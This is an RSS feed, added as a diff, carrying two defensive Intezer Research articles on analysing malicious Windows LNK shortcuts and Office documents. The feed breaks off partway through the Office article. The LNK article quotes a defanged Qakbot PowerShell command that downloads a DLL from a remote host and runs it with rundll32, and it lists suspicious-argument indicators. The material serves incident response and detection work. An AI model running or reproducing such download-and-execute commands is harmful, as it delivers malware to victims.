@@ -1,0 +1,2073 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – How to Analyze</title><link>https://research.intezer.com/docs/how-to-analyze/</link><description>Recent content in How to Analyze on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 17 Jul 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/docs/how-to-analyze/index.xml" rel="self" type="application/rss+xml"/><item><title>LNK Files</title><link>https://research.intezer.com/docs/how-to-analyze/lnk/</link><pubDate>Thu, 10 Nov 2022 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/how-to-analyze/lnk/</guid><description>
+&lt;p&gt;LNK files are based on the Shell Link Binary file format, also known as
+&lt;em&gt;Windows shortcuts&lt;/em&gt;. But what seems a relatively simple ability to execute
+other binaries on the system can inflict great harm when abused by threat
+actors.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-gb/DeployOffice/security/internet-macros-blocked"target="_blank" rel="noopener"&gt;Microsoft&amp;rsquo;s decision&lt;/a&gt;
+to block macros by default for files downloaded from the internet in Office
+applications provoked malware developers to shift to other techniques. Threat
+actors have identified the potential profit of using LNK files in different
+stages of attacks as we expect to see an
+&lt;a href="https://www.proofpoint.com/us/blog/threat-insight/how-threat-actors-are-adapting-post-macro-world"target="_blank" rel="noopener"&gt;increased number of attacks&lt;/a&gt;
+using LNK files, such as
+&lt;a href="https://www.bleepingcomputer.com/news/security/bumblebee-malware-adds-post-exploitation-tool-for-stealthy-infections/"target="_blank" rel="noopener"&gt;Bumblebee&lt;/a&gt;
+and
+&lt;a href="https://thedfirreport.com/2022/04/25/quantum-ransomware/"target="_blank" rel="noopener"&gt;Quantum Ransomware&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In this blog, we will cover the file format to understand better how threat
+actors use LNK files in the different stages of attacks. By getting familiar
+with the LNK (Shell Link) file format and its capabilities, we will present
+open-source tools and methods to inspect and detect malicious LNK files in
+incident response and threat-hunting processes.&lt;/p&gt;
+&lt;h2&gt;What is the LNK File Format?&lt;span class="hx:absolute hx:-mt-20" id="what-is-the-lnk-file-format"&gt;&lt;/span&gt;
+&lt;a href="#what-is-the-lnk-file-format" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/lnk/images/fig1.png" title="The five structures that compose a shell link binary (LNK) file." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;The five structures that compose a shell link binary (LNK) file.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;According to Microsoft&amp;rsquo;s
+&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/a6c2f32d-2297-4727-bcd3-5d3669573bcb"target="_blank" rel="noopener"&gt;documentation on Shell Link Binary files&lt;/a&gt;,
+the most common way to store Shell Link Binary files is by using the &lt;code&gt;.lnk&lt;/code&gt;
+file extension. LNK files contains a reference to a location on the system
+referred to as a link target. The format consists of five structures: some are
+mandatory, while others are optional. We will not cover every parameter in the
+structures, but focus on the parameters that can help identify suspicious LNK
+files.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;SHELL_LINK_HEADER&lt;/code&gt; - This is a mandatory structure that contains
+information and flags necessary for the rest of the structures in the file.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ae350202-3ba9-4790-9e9e-98935f4ee5af"target="_blank" rel="noopener"&gt;&lt;code&gt;LinkFlags&lt;/code&gt;&lt;/a&gt;
+structure specific, which shell link structures (described below) are
+present in the file. For example, if the &lt;code&gt;HasRelativePath&lt;/code&gt; flag is set,
+&lt;code&gt;RELATIVE_PATH&lt;/code&gt; in the &lt;code&gt;STRING_DATA&lt;/code&gt; structure will contain the relevant
+information.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/378f485c-0be9-47a4-a261-7df467c3c9c6"target="_blank" rel="noopener"&gt;&lt;code&gt;FileAttributesFlags&lt;/code&gt;&lt;/a&gt;
+structure holds information about the attributes of the link target. For
+example, if the &lt;code&gt;FILE_ATTRIBUTE_DIRECTORY&lt;/code&gt; bit is set, the target is a
+directory rather than a file. The fields in this structure can provide
+more context about the link target, which can help the investigation
+process.&lt;/li&gt;
+&lt;li&gt;Access, creation, and write time: this can be useful to determine the
+creation and modification time of the file as part of an incident response
+process.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8cd21240-1b5d-43e6-adc4-38cf14e30cea"target="_blank" rel="noopener"&gt;&lt;code&gt;HotKeyFlags&lt;/code&gt;&lt;/a&gt;
+structure specifies a combination of keys that will invoke the
+application.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;LINKTARGET_IDLIST&lt;/code&gt; - Specifies the target of the link using
+&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6ac3b286-6640-4cf3-85f2-4085c02e6a71"target="_blank" rel="noopener"&gt;&lt;code&gt;ItemID&lt;/code&gt;&lt;/a&gt;
+structure.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;LINKINFO&lt;/code&gt; - Holds information about the location of a link target,
+including volume, serial number, and local paths.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;STRING_DATA&lt;/code&gt; - Holds information about paths and interfaces for the link
+target. The structures are optional, and they will be present only if the
+appropriate flag in &lt;code&gt;LinkFlags&lt;/code&gt; (in the &lt;code&gt;ShellLinkHeader&lt;/code&gt;) is set. The
+following structures can be useful in identifying malicious LNK files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;RELATIVE_PATH&lt;/code&gt;: defines the location of the link target relative to the
+file that contains the shell link.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;WORKING_DIR&lt;/code&gt;: defines the file system path of the working directory to be
+used when activating the link target.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;COMMAND_LINE_ARGUMENTS&lt;/code&gt;: stores the command-line arguments specified when
+activating the link target.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;EXTRA_DATA&lt;/code&gt; - Optional structures contain additional information about the
+link target. Of all of the possible structures, the following can be very
+useful in the investigation:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;If the link target uses an environment variable, the
+&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72"target="_blank" rel="noopener"&gt;&lt;code&gt;EnvironmentVariableDataBlock&lt;/code&gt;&lt;/a&gt;
+structure will hold a path to environment variable information.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;TrackerDataBlock&lt;/code&gt;: this structure holds information that helps locate the
+link target if it wasn&amp;rsquo;t found in its original location. One of the fields
+is the MAC address of the machine where the link target was last seen. If
+the MAC address specified in the LNK file doesn&amp;rsquo;t match the MAC address of
+the host, it means that LNK was created on another machine. So we need to
+understand if it&amp;rsquo;s a machine within the organization or an authorized
+entity or if the file was created and dropped by an attacker.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;How LNK files are used by threat actors&lt;span class="hx:absolute hx:-mt-20" id="how-lnk-files-are-used-by-threat-actors"&gt;&lt;/span&gt;
+&lt;a href="#how-lnk-files-are-used-by-threat-actors" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LNK files can execute any file on the system with arguments (path, arguments,
+etc.) based on the configuration provided by the file&amp;rsquo;s creator. The content of
+the LNK file – what and how it will be executed – can be viewed using different
+tools or just by right-clicking it to open the properties window of the file.
+But most users don&amp;rsquo;t check each LNK file before executing it. Essentially LNK
+files provide attackers with an easy way to execute malicious binaries or
+trusted leaving-of-the-land binaries
+(&lt;a href="https://lolbas-project.github.io/"target="_blank" rel="noopener"&gt;LolBins&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/lnk/images/fig2.png" title="Inspecting LNK files using the properties window." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Inspecting LNK files using the properties window.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Usually, LNK files are used in the delivery stage of the attack. The goal of
+this stage is to deploy the next stage of the attack or execute the malware.
+One of the ways to deliver the malicious files to the endpoint is using an
+archive file, a technique that attackers started to use more extensively based
+on
+&lt;a href="https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-q2-2022/"target="_blank" rel="noopener"&gt;HP&amp;rsquo;s report&lt;/a&gt;
+from Q2 2022.
+&lt;a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/#:~:text=During%20the%20second,the%20LNK%20attacks"target="_blank" rel="noopener"&gt;Recently&lt;/a&gt;,
+attackers started to use LNK files as downloaders instead of packing the
+malicious code in the archive or using other file formats, such as macros. To
+carry out the attack, LNK files are set to execute either PowerShell, VBScript,
+or MSHTA with pre-defined arguments or execute commands from another file that
+is dropped with the LNK file.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/emotet-malware-infects-users-again-after-fixing-broken-installer/#:~:text=last%20friday%2C%20the%20emotet%20malware%20distributors%20launched%20a%20new%20email%20campaign%20that%20included%20password-protected%20zip%20file%20attachments%20containing%20windows%20lnk%20%28shortcut%29%20files%20pretending%20to%20be%20word%20documents."target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
+used this technique in a phishing email they sent to the victims, including a
+password-protected zip file that contained an LNK file disguised as a Word
+document that executes a VBS script which downloads malware.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/bumblebee-malware-adds-post-exploitation-tool-for-stealthy-infections/"target="_blank" rel="noopener"&gt;Bumblebee&lt;/a&gt;,
+a new and advanced loader, uses an LNK file as part of the attack flow. So far,
+it has two versions, one delivered ISO file and the latter a VHD. In both
+cases, an LNK file is included. In the first version, the LNK executed the
+accompanying DLL, which contains the malicious payload. The later version is
+more advanced, and the LNK file executes an attached PowerShell file that loads
+the second stage of the loader.&lt;/p&gt;
+&lt;p&gt;Some malware developers took it one step further and created a tool for
+creating malicious LNK files called
+&lt;a href="https://blog.cyble.com/2022/06/22/quantum-software-lnk-file-based-builders-growing-in-popularity/"target="_blank" rel="noopener"&gt;Quantum&lt;/a&gt;,
+and it&amp;rsquo;s sold on the dark web. It allows other criminals to create malicious
+files with extra capabilities such as UAC bypass, delayed execution,
+post-execution hiding, and a variety of double extensions.&lt;/p&gt;
+&lt;h2&gt;How to Analyze and Detect Malicious LNK Files&lt;span class="hx:absolute hx:-mt-20" id="how-to-analyze-and-detect-malicious-lnk-files"&gt;&lt;/span&gt;
+&lt;a href="#how-to-analyze-and-detect-malicious-lnk-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In the process of incident response or threat hunting, when we have a
+suspicious file, we can choose to do static analysis or dynamic analysis (or
+both). Executing an LNK file in a sandbox or a VM can greatly assist in
+identifying suspicious activity. However, as we saw in the examples above, some
+attacks rely on additional files and parameters that the LNK file will execute.
+In this case, we will need to have all of the relevant files in the testing
+environment, and this is not always possible so we will proceed to a static
+analysis.&lt;/p&gt;
+&lt;p&gt;There are multiple applications and tools to inspect the structure of an LNK
+file. In this post, we will use
+&lt;a href="https://pypi.org/project/LnkParse3/"target="_blank" rel="noopener"&gt;LnkParse3&lt;/a&gt;, a minimalistic CLI tool based
+on python3 that is easy to install and use. The result of the parsing is
+presented in a format that resembles the LNK structure described above.&lt;/p&gt;
+&lt;p&gt;Based on LNK files that were used in previously reported attacks, we have
+gathered indicators that can help identify suspicious LNK files. This
+information can be pulled from the LNK file using tools such as &lt;code&gt;LnkParse3&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Local base path that points to legitimate Windows tools that can be used to
+execute scripts and open URLs: &lt;code&gt;cmd&lt;/code&gt;, &lt;code&gt;rundll32&lt;/code&gt;, &lt;code&gt;PowerShell&lt;/code&gt;, &lt;code&gt;MSHTA&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Suspicious command line arguments that contain:
+&lt;ul&gt;
+&lt;li&gt;Commands like &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;frombase64&lt;/code&gt;, &lt;code&gt;ping&lt;/code&gt;, &lt;code&gt;VBScript&lt;/code&gt;, etc.&lt;/li&gt;
+&lt;li&gt;High amount of command line arguments – often malicious LNK files that
+specify command line arguments will have more than four arguments. On top
+of that, the arguments can be obfuscated or include characters that are not
+letters or numbers. But in some cases, legitimate files such as web
+browsers can run processes with many arguments, resulting in shortcut files
+with many command line arguments. In this case, the &lt;code&gt;target&lt;/code&gt; and the
+&lt;code&gt;working_dir&lt;/code&gt; locations can be very helpful in the analysis and inspection
+of the command line arguments.&lt;/li&gt;
+&lt;li&gt;Networking protocols and URLs such as HTTP, HTTPS, and IP addresses.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The file size is relatively big - which indicates that it contains lots of
+data, possibly a script. We noticed that files bigger than 4 KB should be
+considered suspicious files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For example, below is the content of
+&lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
+It downloads a DLL from a remote location and executes it.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32WindowsPowerShellv1.0powershell.exe -NoExit iwr -Uri
+hxxps://news-wellness[.]com/5MVhfo8BnDub/D.png -OutFile
+$env:TEMPtest.dll;Start-Process rundll32.exe $env:TEMPtest.dll,jhbvygftr&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;We can then use URL reputation tools for analysis, like Intezer&amp;rsquo;s
+&lt;a href="../../../docs/url-analysis/part1/"&gt;URL scanning feature&lt;/a&gt;
+shown below, to confirm that the LNK file is opening a malicious link.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/lnk/images/fig3.png" title="Intezer&amp;#39;s URL scanner showing the malicious link opened by a .lnk file." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Intezer&amp;#39;s URL scanner showing the malicious link opened by a .lnk file.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Some of the indicators can differ based on what is considered common in the
+organization, for example, if it is common to have big LNK files that execute
+legitimate scripts. In this case, the indicators need to be tailored for the
+organization, but overall malicious LNK files have a pattern that can be
+identified.&lt;/p&gt;
+&lt;p&gt;Once we have classified an LNK file as suspicious, we should inspect the
+executables and the commands that are being executed and identify what the
+purpose of the file is and whether the endpoint was compromised.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;span class="hx:absolute hx:-mt-20" id="conclusion"&gt;&lt;/span&gt;
+&lt;a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;With the increasing use of LNK files by threat actors, defenders and incident
+responders must understand what these files can do and how to work around them.
+In this blog, we covered the sections of the file format that can reveal
+suspicious indicators, then we presented real-life examples and presented an
+open-sourced tool that can be used to inspect LNK files.&lt;/p&gt;</description></item><item><title>Microsoft Office Files</title><link>https://research.intezer.com/docs/how-to-analyze/office/</link><pubDate>Mon, 16 Oct 2023 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/how-to-analyze/office/</guid><description>
+&lt;p&gt;Phishing attacks are one of the three primary ways attackers get access to
+organizations according to Verizon&amp;rsquo;s
+&lt;a href="https://www.verizon.com/business/resources/reports/2023-data-breach-investigations-report-dbir.pdf"target="_blank" rel="noopener"&gt;2023 Data Breach Investigations Report&lt;/a&gt;&amp;hellip;
+and many phishing attacks arrive via emails containing malicious attachments. A
+seemingly innocent Microsoft Word file, for example, can be the initial
+infection stage of a dangerous attack where a threat actor uses a document to
+deliver malware.&lt;/p&gt;
+&lt;h2&gt;Handling Malicious Microsoft Office Files During Incident Response&lt;span class="hx:absolute hx:-mt-20" id="handling-malicious-microsoft-office-files-during-incident-response"&gt;&lt;/span&gt;
+&lt;a href="#handling-malicious-microsoft-office-files-during-incident-response" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;When handling a security breach, the incident response team will collect
+suspicious files and evidence from the compromised endpoint in order to
+investigate the incident. One of the challenges IR teams face is finding all of
+the malicious files that were used in the attack and classifying them to their
+relevant malware family.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Binary files&lt;/strong&gt; are usually the main suspect. We know that malicious code was
+executed, so we search for suspicious binary files containing this code
+(looking for recently installed programs, for example). &lt;strong&gt;Non-binary files&lt;/strong&gt;
+like Microsoft Office documents should also be carefully examined because they
+can be the first stage of an attack that caused the malware execution to begin
+with.&lt;/p&gt;
+&lt;p&gt;Office documents are widely used by threat actors to deliver malware. Usually,
+the file is attached to an email that is crafted to look like a legitimate
+communication. Threat actors use social engineering techniques to persuade the
+victim into opening the malicious attachment.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;In this article, we will explain the different types of Microsoft Office file
+formats and how attackers abuse these documents to deliver malware.&lt;/strong&gt; You will
+also be presented with tools (both free and paid) and techniques that can help
+you better identify and classify malicious Microsoft Office files. At the end
+we&amp;rsquo;ll look at how you can speed up the whole process by using automation to
+analyze a specific file or a high volume of incoming files.&lt;/p&gt;
+&lt;h2&gt;Types of Microsoft Office File Formats&lt;span class="hx:absolute hx:-mt-20" id="types-of-microsoft-office-file-formats"&gt;&lt;/span&gt;
+&lt;a href="#types-of-microsoft-office-file-formats" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;When collecting files that could be related to an incident, you might notice
+that many files contain various extensions (&lt;code&gt;.txt&lt;/code&gt;, &lt;code&gt;.dotm&lt;/code&gt;, &lt;code&gt;.zip&lt;/code&gt;, &lt;code&gt;.docx&lt;/code&gt;,
+&lt;code&gt;.pdf&lt;/code&gt;) which belong to different applications. For the purpose of this blog,
+we will focus on the three main types of file formats in Microsoft Office:
+&lt;strong&gt;Word&lt;/strong&gt;, &lt;strong&gt;Excel&lt;/strong&gt;, and &lt;strong&gt;PowerPoint&lt;/strong&gt;. First, let&amp;rsquo;s explain the structure of
+these files and how they differ from one another.&lt;/p&gt;
+&lt;h3&gt;Object Linking and Embedding (OLE)&lt;span class="hx:absolute hx:-mt-20" id="object-linking-and-embedding-ole"&gt;&lt;/span&gt;
+&lt;a href="#object-linking-and-embedding-ole" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;OLE2 format was used in Microsoft Word 97–2003 documents and other Microsoft
+products such as Outlook messages. The well-known file extensions &lt;strong&gt;&lt;code&gt;.doc&lt;/code&gt;,
+&lt;code&gt;.xls&lt;/code&gt; and &lt;code&gt;.ppt&lt;/code&gt;&lt;/strong&gt; are all file types based on the OLE format. An OLE file is
+a compound file and it is structured as a file system within a file. OLE files
+are formatted as ZIP and the contents of the file can be viewed using
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/oledir.py"target="_blank" rel="noopener"&gt;&lt;code&gt;oledir&lt;/code&gt;&lt;/a&gt;
+utility (this is part of
+&lt;a href="https://github.com/decalage2/oletools"target="_blank" rel="noopener"&gt;oletools&lt;/a&gt; which will be explained later
+in this post).&lt;/p&gt;
+&lt;p&gt;The OLE file contains:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Streams&lt;/strong&gt; of data where each stream has a name. A file must contain at
+least one stream. For example, for Word documents, it is mandatory to contain
+a stream called &lt;code&gt;WordDocument&lt;/code&gt;, which is the main stream that contains the
+document text.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Storages&lt;/strong&gt; that contain streams or other storages.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Properties&lt;/strong&gt; that are streams containing information about the document,
+such as author, title, creation, and modification date. Property streams
+always start with &lt;code&gt;x05&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig1.png" title="Layout of an OLE file as presented by oldedir utility, showing the macros storage, main stream, and properties." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Layout of an OLE file as presented by oldedir utility, showing the macros storage, main stream, and properties.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Office Open XML (OOXML)&lt;span class="hx:absolute hx:-mt-20" id="office-open-xml-ooxml"&gt;&lt;/span&gt;
+&lt;a href="#office-open-xml-ooxml" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This file format was incorporated into Microsoft Office 2007. It is a zipped
+XML-based format developed by Microsoft and used for all Microsoft Office
+files. The associated extensions include &lt;strong&gt;&lt;code&gt;.docx&lt;/code&gt;, &lt;code&gt;.xlsx&lt;/code&gt; and &lt;code&gt;.pptx&lt;/code&gt;&lt;/strong&gt;.
+OOXML files are structured in a similar way to OLE files but there are several
+differences between them:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Each directory in the OOXML file contains a &lt;code&gt;.xml&lt;/code&gt; file that can be seen in
+the screenshot below.&lt;/li&gt;
+&lt;li&gt;A file called &lt;code&gt;[Content_Types].xml&lt;/code&gt; must be in the root directory of the
+archive. It contains all of the content types included in the archive.&lt;/li&gt;
+&lt;li&gt;OOXML files cannot contain VBA macros (we will elaborate on this in the next
+section).&lt;/li&gt;
+&lt;li&gt;OOXML files contain any objects including images, OLE objects&lt;sup id="fnref:1"&gt;&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref"&gt;1&lt;/a&gt;&lt;/sup&gt;, PE files,
+media files, and more.&lt;/li&gt;
+&lt;li&gt;Relationships between objects are described in the files with &lt;code&gt;.rels&lt;/code&gt;
+extension.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig2.png" title="Layout of an OOXML file." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Layout of an OOXML file.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Rich Text Format (RTF)&lt;span class="hx:absolute hx:-mt-20" id="rich-text-format-rtf"&gt;&lt;/span&gt;
+&lt;a href="#rich-text-format-rtf" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;RTF is another document format developed by Microsoft. RTF files encode text
+and graphics in a way that makes it possible to share the file between
+applications. In the past, it was more difficult to open a &lt;code&gt;.doc&lt;/code&gt; file without
+having Microsoft Office or even a Windows PC, so using RTF became a convenient
+solution.&lt;/p&gt;
+&lt;p&gt;Unlike the previous formats we talked about, RTF files consist of unformatted
+text, control words, groups, backslash, and delimiters. Like OOXML, RTF files
+don&amp;rsquo;t support macros.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig3.png" title="Output of oleid utility for an RTF file." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Output of oleid utility for an RTF file.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;For more information about
+&lt;a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-oleds/fdc5e702-d09e-4344-a77f-eb079d41f23f"target="_blank" rel="noopener"&gt;OLE&lt;/a&gt;,
+&lt;a href="https://support.microsoft.com/en-us/office/open-xml-formats-and-file-name-extensions-5200d93c-3449-4380-8e11-31ef14555b18"target="_blank" rel="noopener"&gt;OOXML&lt;/a&gt;,
+and &lt;a href="https://docs.fileformat.com/word-processing/rtf/"target="_blank" rel="noopener"&gt;RTF&lt;/a&gt; files, see
+Microsoft&amp;rsquo;s documentation.&lt;/p&gt;
+&lt;p&gt;In general, you should never trust the suffix of a file because attackers
+deliberately change the suffix to trick victims into opening them. Always
+verify the file type that you are analyzing. You can use the &lt;code&gt;file&lt;/code&gt; command
+(Linux/Mac) or the
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/doc/oleid.md"target="_blank" rel="noopener"&gt;&lt;code&gt;oleid&lt;/code&gt;&lt;/a&gt;
+utility from oletools developed by
+&lt;a href="https://twitter.com/decalage2"target="_blank" rel="noopener"&gt;Decalage&lt;/a&gt;. This utility displays useful and
+important information about the file, including the file type and encryption.&lt;/p&gt;
+&lt;h2&gt;Why Document Files Can be Dangerous and How to Analyze Them&lt;span class="hx:absolute hx:-mt-20" id="why-document-files-can-be-dangerous-and-how-to-analyze-them"&gt;&lt;/span&gt;
+&lt;a href="#why-document-files-can-be-dangerous-and-how-to-analyze-them" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are several ways in which a document can be weaponized with malware and
+used to launch an attack.&lt;/p&gt;
+&lt;h3&gt;Office Macros&lt;span class="hx:absolute hx:-mt-20" id="office-macros"&gt;&lt;/span&gt;
+&lt;a href="#office-macros" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This technique is documented within MITRE ATT&amp;amp;CK®
+&lt;a href="https://attack.mitre.org/techniques/T1137/001/"target="_blank" rel="noopener"&gt;T1137&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Macros save users time by allowing them to automate a series of commands that
+can be triggered by different actions. Usually, macros are written in
+&lt;a href="https://docs.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office"target="_blank" rel="noopener"&gt;Visual Basic for Applications&lt;/a&gt;
+(VBA), a language developed by Microsoft and supported by all Microsoft Office
+products. Another way to create a macro is to record it within the Microsoft
+Office application. Macros are a powerful tool that gives users access and
+permissions to resources of the local system. Attackers use macros to modify
+files on the system and to execute the next stage of an attack.&lt;/p&gt;
+&lt;p&gt;By default, OOXML files (&lt;code&gt;.docx&lt;/code&gt;, &lt;code&gt;.xlsx&lt;/code&gt;, &lt;code&gt;.pptx&lt;/code&gt;) can&amp;rsquo;t be used to store
+macros. Only specific files with enabled-macro can be used to contain VBA
+macros. The goal is to make it easier to detect files that have macros and to
+reduce the risk of attacks that use macros. Files with enabled macros use the
+letter &lt;em&gt;m&lt;/em&gt; at the end of the extension such as &lt;code&gt;.dotm&lt;/code&gt;, &lt;code&gt;.docm&lt;/code&gt;, &lt;code&gt;.xlsm&lt;/code&gt;, and
+&lt;code&gt;.pptm&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Because of the great security risks of macros, Microsoft added several security
+measures to restrict the execution of macros. The most effective way to protect
+the system is to entirely disable macros, but it&amp;rsquo;s not always possible as
+macros are a handy tool for many organizations. Another option is manually
+enabling macros and enforcing limitations on the source and integrity of the
+document. When a user opens a file containing macros, including OLM files such
+as &lt;code&gt;.doc&lt;/code&gt;, Microsoft Office applications will show a warning message. An
+alternative solution is to open files in
+&lt;a href="https://support.microsoft.com/en-us/topic/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653"target="_blank" rel="noopener"&gt;Protected View&lt;/a&gt;.
+Essentially, the file is available only for reading to prevent attackers from
+executing commands and manipulating the user or file. For more information,
+check out
+&lt;a href="https://support.microsoft.com/en-us/office/enable-or-disable-macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6"target="_blank" rel="noopener"&gt;Microsoft&amp;rsquo;s website&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In a
